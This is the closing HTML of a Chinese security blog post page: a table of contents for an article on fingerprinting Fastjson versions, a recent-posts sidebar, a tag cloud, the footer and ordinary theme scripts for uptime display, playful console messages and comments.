  </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%80%9A%E8%BF%87%E7%89%B9%E6%80%A7%E6%94%AF%E6%8C%81%E5%B7%AE%E5%BC%82%E6%8E%A2%E6%B5%8B"><span class="toc-number">5.2.1.</span> <span class="toc-text">2. 通过特性支持差异探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%B5%8B%E8%AF%95-Feature-SupportNonPublicField-%E6%94%AF%E6%8C%81"><span class="toc-number">5.2.1.1.</span> <span class="toc-text">(1) 测试 Feature.SupportNonPublicField 支持</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%B5%8B%E8%AF%95-autoTypeSupport-%E9%BB%98%E8%AE%A4%E7%8A%B6%E6%80%81"><span class="toc-number">5.2.1.2.</span> <span class="toc-text">(2) 测试 autoTypeSupport 默认状态</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8%E7%89%88%E6%9C%AC%E7%8B%AC%E6%9C%89%E7%89%B9%E6%80%A7"><span class="toc-number">5.2.2.</span> <span class="toc-text">3. 利用版本独有特性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%97%B6%E9%97%B4%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%B7%AE%E5%BC%82"><span class="toc-number">5.2.2.1.</span> <span class="toc-text">(1) 时间格式化差异</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E8%8A%82%E7%A0%81%E6%94%AF%E6%8C%81%EF%BC%88TemplatesImpl-%E9%93%BE%EF%BC%89"><span class="toc-number">5.2.2.2.</span> <span class="toc-text">(2) 反序列化字节码支持（TemplatesImpl 链）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%93%8D%E5%BA%94%E5%A4%B4%E4%B8%8E%E5%BA%93%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2"><span class="toc-number">5.2.3.</span> <span class="toc-text">4. 响应头与库路径泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%A7%82%E5%AF%9F-HTTP-%E5%93%8D%E5%BA%94%E5%A4%B4"><span class="toc-number">5.2.3.1.</span> <span class="toc-text">(1) 观察 HTTP 响应头</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%A7%A6%E5%8F%91%E7%B1%BB%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2"><span class="toc-number">5.2.3.2.</span> <span class="toc-text">(2) 触发类路径泄露</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%87%BA%E7%BD%91%E6%8E%A2%E6%B5%8B"><span class="toc-number">5.2.4.</span> <span class="toc-text">5.出网探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%AD%A3%E5%88%99%E5%BB%B6%E8%BF%9F%E6%8E%A2%E6%B5%8B"><span class="toc-number">5.2.5.</span> <span class="toc-text">6.正则延迟探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E4%BE%9D%E8%B5%96%E6%8E%A2%E6%B5%8B"><span class="toc-number">5.2.6.</span> <span class="toc-text">7.依赖探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8E%A2%E6%B5%8B%E5%B7%A5%E5%85%B7"><span class="toc-number">5.2.7.</span> <span class="toc-text">8. 自动化探测工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-FastjsonScan"><span class="toc-number">5.2.7.1.</span> <span class="toc-text">(1) FastjsonScan</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Burp-Suite-%E6%8F%92%E4%BB%B6"><span class="toc-number">5.2.7.2.</span> <span class="toc-text">(2) Burp Suite 插件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%88%E6%9C%AC%E5%88%A4%E5%AE%9A%E5%AF%B9%E7%85%A7%E8%A1%A8"><span class="toc-number">5.2.8.</span> <span class="toc-text">版本判定对照表</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/5304/" title="域横向移动工具对比"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="域横向移动工具对比"/></a><div class="content"><a class="title" href="/posts/5304/" title="域横向移动工具对比">域横向移动工具对比</a><time datetime="2025-05-03T16:00:00.000Z" title="发表于 2025-05-04 00:00:00">2025-05-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/64101/" title="Weblogic常见安全漏洞"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/oracle-weblogic.png?x-oss-process=style/img-to-webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Weblogic常见安全漏洞"/></a><div class="content"><a class="title" href="/posts/64101/" title="Weblogic常见安全漏洞">Weblogic常见安全漏洞</a><time datetime="2025-03-29T16:00:00.000Z" title="发表于 2025-03-30 00:00:00">2025-03-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/8399/" title="禅道漏洞"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/zentao_logo.png?x-oss-process=style/img-to-webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="禅道漏洞"/></a><div class="content"><a class="title" href="/posts/8399/" title="禅道漏洞">禅道漏洞</a><time datetime="2025-03-29T16:00:00.000Z" title="发表于 2025-03-30 00:00:00">2025-03-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/56203/" title="WX小程序渗透"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/170_a_6661_52f20a56.jpg?x-oss-process=style/img-to-webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WX小程序渗透"/></a><div class="content"><a class="title" href="/posts/56203/" title="WX小程序渗透">WX小程序渗透</a><time datetime="2025-03-28T16:00:00.000Z" title="发表于 2025-03-29 00:00:00">2025-03-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/18454/" title="Nginx常见安全漏洞"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/nginx01.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nginx常见安全漏洞"/></a><div class="content"><a class="title" href="/posts/18454/" title="Nginx常见安全漏洞">Nginx常见安全漏洞</a><time datetime="2025-03-26T16:00:00.000Z" title="发表于 2025-03-27 00:00:00">2025-03-27</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="workboard"><img class="workSituationImg boardsign" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/184064234.png" alt="网络安全行业初级从业者！~" title="网络安全行业初级从业者！~"/><div id="runtimeTextTip"></div></div></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2022 - 2025 By <a class="footer-bar-link" href="/" title="Takake" target="_blank">Takake</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com" title="GITHUB">GITHUB</a><a class="footer-bar-link" target="_blank" rel="noopener" href="https://chat.opengpt.lol" title="CHATGPT">CHATGPT</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">84</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">148</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">12</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://blog.takake.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https:/api.opengpt.lol/" title="GPT-API"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="GPT-API"/><span class="back-menu-item-text">GPT-API</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 站点动态</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>5</sup></a><a href="/tags/Chrome/" style="font-size: 0.88rem;">Chrome<sup>2</sup></a><a href="/tags/Fastjson/" style="font-size: 0.88rem;">Fastjson<sup>1</sup></a><a href="/tags/IPV6/" style="font-size: 0.88rem;">IPV6<sup>1</sup></a><a href="/tags/JAVA/" style="font-size: 0.88rem;">JAVA<sup>3</sup></a><a href="/tags/JAVA%E9%AB%98%E7%BA%A7/" style="font-size: 0.88rem;">JAVA高级<sup>1</sup></a><a href="/tags/JSON%E6%B3%A8%E5%85%A5/" style="font-size: 0.88rem;">JSON注入<sup>1</sup></a><a href="/tags/JS%E9%80%86%E5%90%91/" style="font-size: 0.88rem;">JS逆向<sup>2</sup></a><a href="/tags/NAS/" style="font-size: 0.88rem;">NAS<sup>3</sup></a><a href="/tags/NTLM/" style="font-size: 0.88rem;">NTLM<sup>1</sup></a><a href="/tags/PHP/" style="font-size: 0.88rem;">PHP<sup>2</sup></a><a href="/tags/RCE/" style="font-size: 0.88rem;">RCE<sup>18</sup></a><a href="/tags/TLS/" style="font-size: 0.88rem;">TLS<sup>1</sup></a><a href="/tags/cisp/" style="font-size: 0.88rem;">cisp<sup>2</sup></a><a href="/tags/esxi/" style="font-size: 0.88rem;">esxi<sup>1</sup></a><a href="/tags/html/" style="font-size: 0.88rem;">html<sup>1</sup></a><a href="/tags/javascript/" style="font-size: 0.88rem;">javascript<sup>1</sup></a><a href="/tags/kerberos/" style="font-size: 0.88rem;">kerberos<sup>1</sup></a><a href="/tags/nas/" style="font-size: 0.88rem;">nas<sup>1</sup></a><a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" style="font-size: 0.88rem;">中间件<sup>15</sup></a><a href="/tags/%E4%BA%91%E5%AD%98%E5%82%A8/" style="font-size: 0.88rem;">云存储<sup>1</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>15</sup></a><a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">反序列化<sup>4</sup></a><a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 0.88rem;">域渗透测试<sup>2</sup></a><a href="/tags/%E5%AE%9E%E9%AA%8C/" style="font-size: 0.88rem;">实验<sup>1</sup></a><a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size: 0.88rem;">密码<sup>8</sup></a><a href="/tags/%E5%BC%80%E5%8F%91/" style="font-size: 0.88rem;">开发<sup>4</sup></a><a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 0.88rem;">操作系统<sup>3</sup></a><a href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" style="font-size: 0.88rem;">横向移动<sup>3</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 0.88rem;">渗透测试<sup>22</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 0.88rem;">漏洞复现<sup>22</sup></a><a href="/tags/%E7%A1%AC%E7%9B%98/" style="font-size: 0.88rem;">硬盘<sup>1</sup></a><a href="/tags/%E7%A7%81%E6%9C%89%E4%BA%91/" style="font-size: 0.88rem;">私有云<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 0.88rem;">网络协议<sup>2</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">网络安全<sup>10</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/" style="font-size: 0.88rem;">网络配置<sup>1</sup></a><a href="/tags/%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/" style="font-size: 0.88rem;">认证机制<sup>3</sup></a><a href="/tags/%E8%AF%81%E4%B9%A6/" style="font-size: 0.88rem;">证书<sup>1</sup></a><a href="/tags/%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/" style="font-size: 0.88rem;">限制绕过<sup>1</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">靶场<sup>3</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8923547078" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://music.163.com/#/playlist?id=8923547078&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/cdn/lib/js/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("12/01/2023 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎来到My Blog!`,
    `生活明朗, 万物可爱`,
    `
    ████████╗ █████╗ ██╗  ██╗ █████╗ ██╗  ██╗███████╗
    ╚══██╔══╝██╔══██╗██║ ██╔╝██╔══██╗██║ ██╔╝██╔════╝
       ██║   ███████║█████╔╝ ███████║█████╔╝ █████╗  
       ██║   ██╔══██║██╔═██╗ ██╔══██║██╔═██╗ ██╔══╝  
       ██║   ██║  ██║██║  ██╗██║  ██║██║  ██╗███████╗
       ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
        `,
    "已上线",
    dnum,
    "天",
    "©2022 By Takake V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【骇客】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Takake 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script async="async">(function () {
  var grt = new Date("12/01/2023 00:00:00"); //设置网站上线时间
  var now = new Date();
  var dnum;
  var hnum;
  var mnum;
  var snum;
  var nowHour;

  // 计算并更新天数、小时数、分钟数和秒数
  function updateTime() {
    now = new Date(); // 更新 now 的值
    nowHour = now.getHours(); // 更新 nowHour 的值
    var days = (now - grt) / 1000 / 60 / 60 / 24;
    dnum = Math.floor(days);
    var hours = (now - grt) / 1000 / 60 / 60 - 24 * dnum;
    hnum = Math.floor(hours);
    if (String(hnum).length == 1) {
      hnum = "0" + hnum;
    }
    var minutes = (now - grt) / 1000 / 60 - 24 * 60 * dnum - 60 * hnum;
    mnum = Math.floor(minutes);
    if (String(mnum).length == 1) {
      mnum = "0" + mnum;
    }
    var seconds = (now - grt) / 1000 - 24 * 60 * 60 * dnum - 60 * 60 * hnum - 60 * mnum;
    snum = Math.round(seconds);
    if (String(snum).length == 1) {
      snum = "0" + snum;
    }
  }

  // 更新网页中显示的网站运行时间
  function updateHtml() {
    const footer = document.getElementById("footer");
    if (!footer) return
    let currentTimeHtml = "";
    if (nowHour < 18 && nowHour >= 9) {
      // 如果是上班时间，默认就是"安知鱼-上班摸鱼中.svg"图片，不需要更改
      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    } else {
      // 如果是下班时间，插入"安知鱼-下班啦.svg"图片
      let img = document.querySelector("#workboard .workSituationImg");
      if (img != null) {
        img.src = "https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/184064228.png";
        img.title = "下班玩人工智能，嘿嘿~";
        img.alt = "下班玩人工智能，嘿嘿~";
      }

      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    }

    if (document.getElementById("runtimeTextTip")) {
      document.getElementById("runtimeTextTip").innerHTML = currentTimeHtml;
    }
  }

  setInterval(() => {
    updateTime();
    updateHtml();
  }, 1000);
})();</script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://takake.netlify.app/.netlify/functions/twikoo',
      region: '',
      onCommentLoaded: () => {
        anzhiyu.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') setTimeout(runFn,0)
    else getScript('https://cdn.cbd.int/twikoo@1.6.25/dist/twikoo.all.min.js').then(runFn)
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://takake.netlify.app/.netlify/functions/twikoo',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const runFn = () => {
    init();
    
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else {
      loadTwikoo()
    }
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getComment = () => {
    const runTwikoo = () => {
      twikoo.getRecentComments({
        envId: 'https://takake.netlify.app/.netlify/functions/twikoo',
        region: '',
        pageSize: 6,
        includeReply: true
      }).then(function (res) {
        const twikooArray = res.map(e => {
          return {
